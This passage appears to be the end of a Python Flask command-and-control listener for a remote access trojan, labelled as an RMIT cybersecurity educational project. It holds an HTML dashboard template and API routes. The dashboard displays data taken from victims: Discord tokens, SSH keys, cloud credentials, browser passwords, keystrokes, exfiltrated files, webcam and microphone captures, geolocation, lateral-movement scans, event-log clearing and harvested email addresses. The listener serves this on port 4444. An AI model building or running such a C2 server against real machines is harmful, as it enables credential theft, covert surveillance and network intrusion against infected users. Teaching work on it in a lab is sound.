            <h2>TOKEN & SECRET HARVEST (T1528)</h2>
            {% if data.tokens %}
            {% set s = data.tokens.get('summary', {}) %}
            <div class="stat"><span class="label">Discord Tokens:</span><span class="value alert">{{ s.get('discord_tokens_found', 0) }}</span></div>
            <div class="stat"><span class="label">SSH Private Keys:</span><span class="value alert">{{ s.get('ssh_keys_found', 0) }}</span></div>
            <div class="stat"><span class="label">Cloud Credential Files:</span><span class="value alert">{{ s.get('cloud_cred_files', 0) }}</span></div>
            <div class="stat"><span class="label">.env Files:</span><span class="value">{{ s.get('env_files_found', 0) }}</span></div>
            {% if data.tokens.discord_tokens %}
            <div style="margin-top:8px; font-size:12px; color:#888">Discord tokens:</div>
            {% for t in data.tokens.discord_tokens %}
            <div class="file-item">{{ t.source }}: {{ t.token_preview }} {% if t.is_mfa %}<span class="badge badge-admin">MFA</span>{% endif %}</div>
            {% endfor %}
            {% endif %}
            {% if data.tokens.ssh_keys %}
            <div style="margin-top:8px; font-size:12px; color:#888">SSH keys:</div>
            {% for k in data.tokens.ssh_keys %}
            <div class="file-item">{{ k.filename }} ({{ k.type }}) {% if not k.has_passphrase %}<span class="badge badge-admin">NO PASSPHRASE</span>{% endif %}</div>
            {% endfor %}
            {% endif %}
            {% if data.tokens.cloud_credentials %}
            <div style="margin-top:8px; font-size:12px; color:#888">Cloud creds:</div>
            {% for c in data.tokens.cloud_credentials %}
            <div class="file-item">{{ c.provider }}</div>
            {% endfor %}
            {% endif %}
            {% else %}
            <div style="color:#666">Waiting for token harvest...</div>
            {% endif %}
        </div>
    </div>

    <!-- NEW: Network Recon -->
    {% if data.network_recon %}
    <div class="grid">
        <div class="card">
            <h2>NETWORK MAP (T1049 + T1018)</h2>
            {% set ns = data.network_recon.get('summary', {}) %}
            <div class="stat"><span class="label">Devices (ARP):</span><span class="value">{{ ns.get('devices_on_network', 0) }}</span></div>
            <div class="stat"><span class="label">Active Connections:</span><span class="value">{{ ns.get('active_connections', 0) }}</span></div>
            <div class="stat"><span class="label">DNS Cache:</span><span class="value">{{ ns.get('dns_entries', 0) }}</span></div>
            <div class="stat"><span class="label">Listening Ports:</span><span class="value">{{ ns.get('listening_ports', 0) }}</span></div>
            <div class="stat"><span class="label">Network Shares:</span><span class="value">{{ ns.get('shares', 0) }}</span></div>
            {% if data.network_recon.arp_table %}
            <div style="margin-top:8px; font-size:12px; color:#888">ARP entries (lateral movement targets):</div>
            {% for a in data.network_recon.arp_table[:8] %}
            <div class="file-item">{{ a.ip }} → {{ a.mac }} ({{ a.vendor }})</div>
            {% endfor %}
            {% endif %}
        </div>

        <div class="card">
            <h2>LISTENING SERVICES + DNS CACHE</h2>
            {% if data.network_recon.listening_services %}
            <div style="font-size:12px; color:#888">Open ports (attack surface):</div>
            {% for s in data.network_recon.listening_services[:10] %}
            <div class="file-item">:{{ s.port }} {{ s.bind_addr }} [{{ s.process_name or 'unknown' }}] {{ s.service_hint }}</div>
            {% endfor %}
            {% endif %}
            {% if data.network_recon.dns_cache %}
            <div style="margin-top:8px; font-size:12px; color:#888">Recent DNS (browsing without browser):</div>
            {% for d in data.network_recon.dns_cache[:10] %}
            <div class="file-item">{{ d.name }}</div>
            {% endfor %}
            {% endif %}
        </div>
    </div>
    {% endif %}

    <!-- NEW: Lateral Recon -->
    {% if data.lateral_recon %}
    <div class="grid">
        <div class="card">
            <h2>LATERAL MOVEMENT RECON (T1135 + T1046)</h2>
            {% set ls = data.lateral_recon.get('summary', {}) %}
            <div class="stat"><span class="label">Hosts Scanned:</span><span class="value">{{ ls.get('hosts_scanned', 0) }}</span></div>
            <div class="stat"><span class="label">Open Ports Found:</span><span class="value">{{ ls.get('hosts_with_open_ports', 0) }} hosts</span></div>
            <div class="stat"><span class="label">SMB Hosts:</span><span class="value alert">{{ ls.get('smb_hosts', 0) }}</span></div>
            <div class="stat"><span class="label">Admin Share Access:</span><span class="value alert">{{ ls.get('admin_access_hosts', 0) }}</span></div>
            <div class="stat"><span class="label">In Domain:</span><span class="value">{{ 'YES - ' + ls.get('domain_name', '') if ls.get('in_domain') else 'No' }}</span></div>
            {% if ls.get('domain_users_found', 0) > 0 %}
            <div class="stat"><span class="label">Domain Users:</span><span class="value">{{ ls.get('domain_users_found', 0) }}</span></div>
            {% endif %}
            {% if data.lateral_recon.port_scan %}
            <div style="margin-top:8px; font-size:12px; color:#888">Port scan results:</div>
            {% for ip, ports in data.lateral_recon.port_scan.items() %}
            <div class="file-item">{{ ip }}: {% for p in ports %}{{ p.port }}/{{ p.service }}{% if not loop.last %}, {% endif %}{% endfor %}</div>
            {% endfor %}
            {% endif %}
        </div>

        <div class="card">
            <h2>EVENT LOG STATUS (T1070.001)</h2>
            {% if data.event_logs %}
            {% set es = data.event_logs.get('summary', {}) %}
            <div class="stat"><span class="label">Admin Privileges:</span>
                <span class="value">{% if es.get('is_admin') %}<span class="badge badge-admin">ADMIN</span>{% else %}<span class="badge badge-user">Standard</span>{% endif %}</span>
            </div>
            <div class="stat"><span class="label">Logs Enumerated:</span><span class="value">{{ es.get('logs_enumerated', 0) }}</span></div>
            <div class="stat"><span class="label">Total Records:</span><span class="value">{{ es.get('total_records', 0) }}</span></div>
            <div class="stat"><span class="label">Total Size:</span><span class="value">{{ es.get('total_size_mb', 0) }} MB</span></div>
            {% if es.get('logs_cleared', 0) > 0 %}
            <div class="stat"><span class="label">Logs Cleared:</span><span class="value alert">{{ es.get('logs_cleared') }}</span></div>
            {% endif %}
            {% if data.event_logs.event_logs %}
            <div style="margin-top:8px; font-size:12px; color:#888">Forensic logs:</div>
            {% for l in data.event_logs.event_logs[:6] %}
            <div class="file-item">{{ l.name[:45] }}: {{ l.records }} records ({{ (l.size_bytes / 1024)|int }} KB)</div>
            {% endfor %}
            {% endif %}
            {% else %}
            <div style="color:#666">Waiting for event log data...</div>
            {% endif %}
        </div>
    </div>
    {% endif %}

    <!-- NEW: Geolocation + USB Recon -->
    <div class="grid">
        <div class="card">
            <h2>GEOLOCATION (T1016 + T1614.001)</h2>
            {% if data.geolocation %}
            {% set gs = data.geolocation.get('summary', {}) %}
            {% set geo = data.geolocation.get('geolocation', {}) %}
            <div class="stat"><span class="label">Public IP:</span><span class="value alert">{{ gs.get('public_ip', 'N/A') }}</span></div>
            <div class="stat"><span class="label">Location:</span><span class="value">{{ gs.get('city', '?') }}, {{ gs.get('country', '?') }}</span></div>
            <div class="stat"><span class="label">Coords:</span><span class="value">{{ geo.get('latitude', '?') }}, {{ geo.get('longitude', '?') }}</span></div>
            <div class="stat"><span class="label">ISP:</span><span class="value">{{ gs.get('isp', 'N/A') }}</span></div>
            <div class="stat"><span class="label">Timezone:</span><span class="value">{{ gs.get('timezone', 'N/A') }}</span></div>
            {% if data.geolocation.locale %}
            <div class="stat"><span class="label">Locale:</span><span class="value">{{ data.geolocation.locale.get('default_locale', 'N/A') }}</span></div>
            <div class="stat"><span class="label">Keyboard:</span><span class="value">{{ data.geolocation.locale.get('keyboard_language', 'N/A') }}</span></div>
            {% endif %}
            {% else %}
            <div style="color:#666">Waiting for geolocation data...</div>
            {% endif %}
        </div>

        <div class="card">
            <h2>USB / REMOVABLE MEDIA (T1025)</h2>
            {% if data.usb_recon %}
            {% set us = data.usb_recon.get('summary', {}) %}
            <div class="stat"><span class="label">Drives Found:</span><span class="value">{{ us.get('drives_found', 0) }}</span></div>
            <div class="stat"><span class="label">Interesting Files:</span><span class="value alert">{{ us.get('total_interesting_files', 0) }}</span></div>
            {% for d in data.usb_recon.get('drives', []) %}
            <div style="margin-top:8px; font-size:12px; color:#888">Drive {{ d.drive_letter }}: ({{ d.volume_name }}, {{ d.total_gb }} GB)</div>
            {% for f in d.get('scan', {}).get('interesting_files', [])[:5] %}
            <div class="file-item">{{ f.name }} ({{ f.size_bytes }} bytes)</div>
            {% endfor %}
            {% endfor %}
            {% else %}
            <div style="color:#666">Waiting for USB data...</div>
            {% endif %}
            {% if data.usb_new_drives %}
            <div style="margin-top:8px; font-size:12px; color:#ff0040">New USB insertions detected:</div>
            {% for nd in data.usb_new_drives %}
            <div class="file-item">{{ nd.drive_letter }}: {{ nd.volume_name }} ({{ nd.detected_at[-8:] }})</div>
            {% endfor %}
            {% endif %}
        </div>
    </div>

    <!-- NEW: Webcam + Microphone -->
    <div class="grid">
        <div class="card">
            <h2>WEBCAM CAPTURES (T1125)</h2>
            <div class="stat"><span class="label">Images Captured:</span><span class="value">{{ data.webcam_images|length }}</span></div>
            {% if data.webcam_images %}
            <div style="margin-top:8px; font-size:12px; color:#888">Recent captures:</div>
            {% for wc in data.webcam_images[-5:]|reverse %}
            <div class="file-item">#{{ wc.index }} - {{ wc.timestamp[-8:] }} ({{ wc.width }}x{{ wc.height }}, {{ wc.size_bytes }} bytes)</div>
            {% endfor %}
            {% else %}
            <div style="color:#666">No webcam captures yet</div>
            {% endif %}
        </div>

        <div class="card">
            <h2>AUDIO RECORDINGS (T1123)</h2>
            <div class="stat"><span class="label">Recordings:</span><span class="value">{{ data.microphone_recordings|length }}</span></div>
            {% if data.microphone_recordings %}
            <div style="margin-top:8px; font-size:12px; color:#888">Recent recordings:</div>
            {% for mr in data.microphone_recordings[-5:]|reverse %}
            <div class="file-item">#{{ mr.index }} - {{ mr.timestamp[-8:] }} ({{ mr.duration_seconds }}s, {{ mr.size_bytes }} bytes, peak={{ mr.peak_amplitude }})</div>
            {% endfor %}
            {% else %}
            <div style="color:#666">No audio recordings yet</div>
            {% endif %}
        </div>
    </div>

    <!-- NEW: Process Injection + Email Harvest -->
    <div class="grid">
        <div class="card">
            <h2>PROCESS INJECTION RECON (T1055)</h2>
            {% if data.injection_recon %}
            {% set ijs = data.injection_recon.get('summary', {}) %}
            <div class="stat"><span class="label">Injectable Targets:</span><span class="value">{{ ijs.get('total_targets_found', 0) }}</span></div>
            <div class="stat"><span class="label">Viable Targets:</span><span class="value alert">{{ ijs.get('viable_targets', 0) }}</span></div>
            <div class="stat"><span class="label">Techniques Available:</span><span class="value alert">{{ ijs.get('techniques_available', 0) }}</span></div>
            <div class="stat"><span class="label">Existing Injections:</span><span class="value">{{ ijs.get('existing_injection_signs', 0) }}</span></div>
            {% if data.injection_recon.available_techniques %}
            <div style="margin-top:8px; font-size:12px; color:#888">Available techniques:</div>
            {% for t in data.injection_recon.available_techniques %}
            {% if t.available %}
            <div class="file-item"><span class="badge badge-admin">AVAILABLE</span> {{ t.technique }}</div>
            {% endif %}
            {% endfor %}
            {% endif %}
            {% else %}
            <div style="color:#666">Waiting for injection recon...</div>
            {% endif %}
        </div>

        <div class="card">
            <h2>EMAIL HARVEST (T1087.003)</h2>
            {% if data.email_harvest %}
            {% set es = data.email_harvest.get('summary', {}) %}
            <div class="stat"><span class="label">Outlook Profiles:</span><span class="value">{{ es.get('outlook_count', 0) }}</span></div>
            <div class="stat"><span class="label">Thunderbird Profiles:</span><span class="value">{{ es.get('thunderbird_count', 0) }}</span></div>
            <div class="stat"><span class="label">Windows Mail:</span><span class="value">{{ es.get('windows_mail_count', 0) }}</span></div>
            <div class="stat"><span class="label">Generic Configs:</span><span class="value">{{ es.get('generic_count', 0) }}</span></div>
            <div class="stat"><span class="label">Unique Emails Found:</span><span class="value alert">{{ es.get('unique_emails_found', 0) }}</span></div>
            {% if es.get('emails') %}
            <div style="margin-top:8px; font-size:12px; color:#888">Email addresses:</div>
            {% for email in es.emails %}
            <div class="file-item">{{ email }}</div>
            {% endfor %}
            {% endif %}
            {% else %}
            <div style="color:#666">Waiting for email harvest...</div>
            {% endif %}
        </div>
    </div>

    <button class="kill-btn" onclick="fetch('/kill_switch/activate', {method:'POST', headers:{'Authorization':'Bearer {{ operator_token }}'}}).then(()=>location.reload())">
        ACTIVATE KILL SWITCH
    </button>

    {% endif %}

    <div class="status-bar">
        Auto-refresh every 10 seconds | Dashboard: http://0.0.0.0:4444
    </div>
</body>
</html>
"""


@app.route("/")
def dashboard():
    return render_template_string(DASHBOARD_HTML, data=received_data, encrypt_on=ENCRYPT_COMMS, operator_token=OPERATOR_TOKEN)


@app.route("/api/summary")
def api_summary():
    """API endpoint for raw data summary. Operator-authenticated."""
    err = require_operator_token()
    if err:
        return err

    summary = {
        "connected": received_data["system_info"] is not None,
        "connection_time": received_data["connection_time"],
        "last_seen": received_data["last_seen"],
        "screenshots_count": len(received_data["screenshots"]),
        "keystroke_batches": len(received_data["keystrokes"]),
        "files_exfiltrated": len(received_data["exfiltrated_files"]),
        "clipboard_captures": len(received_data["clipboard"]),
        "browser_password_sets": len(received_data["browser_passwords"]),
        "command_results": len(received_data["command_results"]),
        "has_privilege_info": received_data["privilege_info"] is not None,
        "has_wifi_passwords": received_data["wifi_passwords"] is not None,
        "has_tokens": received_data["tokens"] is not None,
        "has_network_recon": received_data["network_recon"] is not None,
        "has_lateral_recon": received_data["lateral_recon"] is not None,
        "has_event_logs": received_data["event_logs"] is not None,
        "webcam_captures": len(received_data["webcam_images"]),
        "microphone_recordings": len(received_data["microphone_recordings"]),
        "has_geolocation": received_data["geolocation"] is not None,
        "has_usb_recon": received_data["usb_recon"] is not None,
        "usb_new_drives": len(received_data["usb_new_drives"]),
        "has_injection_recon": received_data["injection_recon"] is not None,
        "has_email_harvest": received_data["email_harvest"] is not None,
        "kill_switch": kill_switch,
        "encryption": ENCRYPT_COMMS,
    }
    if received_data["system_info"]:
        summary["target"] = {
            "hostname": received_data["system_info"].get("hostname"),
            "os": received_data["system_info"].get("os"),
            "username": received_data["system_info"].get("username"),
            "ip": received_data["system_info"].get("local_ip")
        }
    return jsonify(summary)


if __name__ == "__main__":
    print("=" * 50)
    print("  C2 LISTENER - RMIT CYBERSECURITY")
    print("  Educational Purpose Only")
    print("=" * 50)
    print(f"\n[*] Starting C2 listener on 0.0.0.0:4444")
    print(f"[*] Dashboard: http://0.0.0.0:4444")
    print(f"[*] Encryption: {'ENABLED (AES-256-CBC)' if ENCRYPT_COMMS else 'DISABLED'}")
    print(f"[*] Loot directory: ./{OUTPUT_DIR}/")
    print(f"[*] Waiting for RAT connection...\n")

    app.run(host="0.0.0.0", port=4444, debug=False)
